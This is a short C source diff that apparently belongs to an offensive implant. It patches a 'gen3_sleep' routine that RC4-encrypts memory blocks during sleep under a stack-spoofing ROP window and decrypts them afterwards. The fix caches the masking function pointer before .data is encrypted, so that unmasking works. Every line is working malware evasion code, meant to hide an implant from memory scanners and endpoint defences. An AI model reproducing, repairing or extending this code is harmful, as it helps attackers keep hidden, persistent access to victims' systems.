@@ -487,6 +487,7 @@ typedef struct {
 	G3_BLOCK * blocks;
 	int nblocks;
 	unsigned char key[16];
+	G3_SF032 fn; /* cached pre-mask: .data (holding g_sf032) is ciphertext until unmask completes */
 } G3_MASKCTX;
 
 static void g3_mask_all_cb(void * vctx)
@@ -544,6 +545,7 @@ BOOL gen3_sleep(DWORD time)
 	mctx.blocks = blocks;
 	mctx.nblocks = nblocks;
 	memcpy(mctx.key, key, 16);
+	mctx.fn = g_sf032;
 
 	if (!g3_stack_spoof_sleep(time, g3_mask_all_cb, &mctx)) {
 		g3_log("sleep: window failed -> fallback", 0x7fffffff);
@@ -551,12 +553,11 @@ BOOL gen3_sleep(DWORD time)
 	}
 	g3_log("sleep: ROP window served", 0x7fffffff);
 
-	/* RC4 twice with the same key restores the plaintext */
-	{
-		G3_SF032 fn = g_sf032;
-		for (i = 0; i < nblocks; i++)
-			g3_rc4(fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
-	}
+	/* RC4 twice with the same key restores the plaintext. The fn pointer
+	 * MUST come from the pre-mask cache: reading g_sf032 now would load
+	 * ciphertext (it lives in .data, still masked at this point). */
+	for (i = 0; i < nblocks; i++)
+		g3_rc4(mctx.fn, blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 	g3_log("sleep: unmasked", 0x7fffffff);
 
 	memset(key, 0, sizeof(key));
